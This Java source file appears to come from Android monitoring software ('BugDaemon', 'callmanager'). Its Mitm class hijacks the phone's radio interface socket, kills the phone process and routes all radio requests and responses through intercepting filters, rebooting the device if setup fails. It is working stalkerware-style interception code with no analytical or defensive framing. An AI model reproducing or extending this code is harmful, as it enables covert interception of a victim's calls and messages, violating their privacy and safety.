package com.vvt.callmanager;

import java.io.FileDescriptor;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Parcel;

import com.fx.daemon.DaemonHelper;
import com.fx.socket.SocketHelper;
import com.fx.socket.SocketReader;
import com.vvt.callmanager.filter.InterceptingFilter;
import com.vvt.callmanager.mitm.MitmHelper;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.command.RemoteKillPhone;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;

public class Mitm {
	
	private static final String TAG = "Mitm";
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	/**
	 * Local flag, which normally used when there is no filters. 
	 */
	private static final boolean LOGAT = false;
	
	private static Mitm sInstance;
	
	private Context mContext;
	private InterceptingFilter mLeftMostProcessor;
	private InterceptingFilter mRightMostProcessor;
	private List<InterceptingFilter> mFilterList;
	private LocalSocket moSocket;
	private LocalSocket mtSocket;
	
	public static Mitm getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new Mitm(context);
		}
		return sInstance;
	}

	private Mitm(Context context) {
		mContext = context;
		mFilterList = new ArrayList<InterceptingFilter>();
	}
	
	/**
	 * Radio socket must be setup before calling this method
	 */
	public void setup() {
		if (LOGV) FxLog.v(TAG, "setup # ENTER ...");
		
		Ril smitm = new Ril();
		int serverFd = smitm.setupServer();
		FileDescriptor fd = FileUtil.getFileDescriptor(serverFd);
		if (fd != null) {
			prepareOriginate(fd);
		}
		if (LOGV) FxLog.v(TAG, "setup # EXIT ...");
	}
	
	public void removeAllFilters() {
		if (LOGV) FxLog.v(TAG, "resetFilter # ENTER ...");
		
		if (mFilterList != null && mFilterList.size() > 0) {
			for (InterceptingFilter filter : mFilterList) {
				filter.setLeftFilter(null);
				filter.setRightFilter(null);
				// Object in each filter DON'T need to be nullified or destroyed.
				// GC will clean it up for you (checked by tracking the Heap size during runtime).
				// Implement destroy() method may cause NullPointerException when switching the filter.
			}
			mFilterList.clear();
		}
		
		mLeftMostProcessor = null;
		mRightMostProcessor = null;
		
		if (LOGV) FxLog.v(TAG, "resetFilter # EXIT ...");
	}

	public void addFilter(InterceptingFilter filter) {
		if (LOGV) FxLog.v(TAG, "addMessageProcessor # ENTER ...");
		int currentSize = mFilterList.size();
		
		if (currentSize > 0) {
			InterceptingFilter lastProcessor = mFilterList.get(currentSize - 1);
			lastProcessor.setRightFilter(filter);
			filter.setLeftFilter(lastProcessor);
		}
		
		if (mLeftMostProcessor == null) {
			mLeftMostProcessor = filter;
		}
		mRightMostProcessor = filter;
		mFilterList.add(filter);
		
		if (LOGV) {
			FxLog.v(TAG, "addMessageProcessor # Current Processor (L->R):-");
			if (mFilterList.size() == 0) {
				FxLog.v(TAG, "addMessageProcessor # None");
			}
			else {
				for (InterceptingFilter p : mFilterList) {
					FxLog.v(TAG, String.format("addMessageProcessor # %s", p.getClass().getName()));
				}
			}
		}
		
		if (LOGV) FxLog.v(TAG, "addMessageProcessor # EXIT ...");
	}
	
	public void writeToOriginate(Parcel p) {
		if (LOGAT) FxLog.v(TAG, String.format("%s = %s", 
				MitmHelper.PREFIX_RESPONSE, 
				MitmHelper.getDisplayString(p)));
		
		if (moSocket == null) {
			if (LOGV) FxLog.v(TAG, "Originate socket is not ready yet");
		}
		else {
			SocketHelper.write(moSocket, p);
		}
	}

	public void writeToTerminate(Parcel p) {
		if (LOGAT) FxLog.v(TAG, String.format("%s = %s", 
				MitmHelper.PREFIX_REQUEST, 
				MitmHelper.getDisplayString(p)));
		
		if (mtSocket == null) {
			if (LOGV) FxLog.v(TAG, "Terminate socket is not ready yet");
		}
		else {
			SocketHelper.write(mtSocket, p);
		}
	}

	private void prepareOriginate(FileDescriptor fd) {
		if (LOGV) FxLog.v(TAG, "prepareOriginate # ENTER ...");
		
		try { 
			final LocalServerSocket server = new LocalServerSocket(fd);
			if (LOGD) FxLog.d(TAG, "prepareOriginate # Socket is created");
			
			// THIS PROCESS DON'T HAVE THE PERMISSION TO KILL OTHERS
			if (LOGD) FxLog.d(TAG, "prepareOriginate # Request killing the phone process");
			RemoteKillPhone remoteCommand = new RemoteKillPhone();
			remoteCommand.execute();
			
			Thread t = new Thread() {
				public void run() {
					try {
						while (true) {
							if (LOGV) FxLog.v(TAG, "serverThread # Ready to accept new client ...");
				            moSocket = server.accept();
				            
				            if (moSocket == null) {
				            	if (LOGE) FxLog.e(TAG, "serverThread # Accept error!!");
				            	break;
				            }
				            
				            if (LOGV) FxLog.v(TAG, "serverThread # Client is being accepted");
			            	SocketReader reader = new SocketReader(moSocket) {
			            		@Override
			            		protected void read(Parcel p) {
			            			writeFromOriginate(p);
			            		}
			            		@Override
			            		protected void onClientDisconnected() {
			            			if (LOGW) FxLog.w(TAG, "Originate # onClientDisconnected");
			            			handleSocketFailed();
			            		}
			            		@Override
			        			protected void onReaderFailed(Exception e) {
			            			if (LOGW) FxLog.w(TAG, String.format(
			            					"Originate # onReaderFailed: %s", e));
			        				handleSocketFailed();
			        			}
			            	};
			            	reader.start();
			            	
			            	prepareTerminate();
						}
						
						if (server != null) {
							server.close();
							if (LOGV) FxLog.v(TAG, "serverThread # Server is closed!");
						}
					}
					catch (IOException e) {
						if (LOGE) FxLog.e(TAG, "serverThread # Error found!!", e);
						handleSocketFailed();
					}
				}
			};
			t.start();
			if (LOGD) FxLog.d(TAG, "prepareOriginate # Server thread is started");
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, "prepareOriginate # Error found!!", e);
			if (LOGE) FxLog.e(TAG, "prepareOriginate # Reboot system ...");
			DaemonHelper.rebootDevice(mContext);
		}
		if (LOGV) FxLog.v(TAG, "prepareOriginate # EXIT ...");
	}

	private void prepareTerminate() throws IOException {
		if (LOGV) FxLog.v(TAG, "prepareTerminate # ENTER ...");
		
		// This method will throw an exception, if a connecting to the server is failed
		mtSocket = SocketHelper.getSocketClient(
				BugDaemonResource.TERMINAL_SOCKET, 
				LocalSocketAddress.Namespace.RESERVED);
		
		if (LOGD) FxLog.d(TAG, "prepareTerminate # Terminal socket is created");
		
		SocketReader reader = new SocketReader(mtSocket) {
			@Override
			protected void read(Parcel p) {
				writeFromTerminate(p);
			}
			@Override
			protected void onClientDisconnected() {
				if (LOGW) FxLog.w(TAG, "terminate # onClientDisconnected");
				handleSocketFailed();
			}
			@Override
			protected void onReaderFailed(Exception e) {
				if (LOGW) FxLog.w(TAG, "terminate # onReaderFailed");
				handleSocketFailed();
			}
		};
		reader.start();
		
		if (LOGD) FxLog.d(TAG, "prepareOriginate # Reader thread is started");
		
		if (LOGV) FxLog.v(TAG, "prepareTerminate # EXIT ...");
	}

	private synchronized void writeFromOriginate(Parcel p) {
		processRilRequest(p);
	}
	
	private synchronized void writeFromTerminate(Parcel p) {
		processResponse(p);
	}
	
	private void processRilRequest(Parcel p) {
		if (mLeftMostProcessor != null) {
			mLeftMostProcessor.processRilRequest(p);
		}
		else {
			writeToTerminate(p);
		}
	}
	
	private void processResponse(Parcel p) {
		if (mRightMostProcessor != null) {
			mRightMostProcessor.processResponse(p);
		}
		else {
			writeToOriginate(p);
		}
	}
	
	private void handleSocketFailed() {
		if (LOGW) FxLog.w(TAG, "handleSocketFailed # Request reset MITM");
		RemoteResetMitm remoteCommand = new RemoteResetMitm();
		try {
			remoteCommand.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("handleSocketFailed # Error: %s", e));
		}
	}

}
